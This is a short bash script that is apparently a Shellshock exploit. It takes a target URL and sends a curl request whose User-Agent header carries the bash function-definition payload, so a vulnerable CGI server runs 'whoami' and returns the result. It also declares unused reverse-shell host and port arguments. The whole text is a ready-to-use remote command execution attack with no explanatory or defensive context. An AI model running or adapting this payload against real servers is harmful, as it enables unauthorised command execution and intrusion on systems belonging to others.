#!/bin/bash
APP_URL="$1"
REVERS_HOST="$2"
REVERS_PORT="$3"


curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /usr/bin/whoami" ${APP_URL}
